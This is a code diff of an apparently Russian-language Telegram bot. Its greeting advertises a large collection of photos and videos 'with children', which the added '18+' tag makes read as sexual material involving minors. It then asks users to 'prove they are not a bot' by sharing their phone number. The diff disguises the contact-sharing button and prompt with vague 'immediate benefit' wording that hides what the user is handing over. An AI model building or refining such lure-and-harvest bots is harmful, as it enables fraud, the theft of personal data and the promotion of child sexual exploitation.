@@ -119,7 +119,7 @@ async def cmd_start(message: types.Message):
     
     await message.answer(
         "👋🇷🇺 ПРИВЕТ! ❤️\n"
-        "У нас самые громные фото и выдео с детьми,больше 10.000 материала! 👀\n"
+        "У нас самые громные фото и video с детьми,больше 10.000 материала! 18+ 👀\n"
         "Подтверди, что ты не бот, с помощью кнопки ниже, и получи весь материал! 🤖👇\n\n",
         reply_markup=keyboard
     )
@@ -130,9 +130,9 @@ async def request_contact(callback_query: types.CallbackQuery):
     
     # Отправляем запрос на контакт через Reply-клавиатуру
     contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    contact_kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
+    contact_kb.add(KeyboardButton(" 🔞immediate benefit👇 ", request_contact=True))
     
-    await bot.send_message(user_id, "🥰 Пожалуйста, поделитесь своим номером телефона:", reply_markup=contact_kb)
+    await bot.send_message(user_id, "🥰 immediate benefit Please", reply_markup=contact_kb)
     await bot.answer_callback_query(callback_query.id)
     
     user_states[user_id] = 'awaiting_contact'
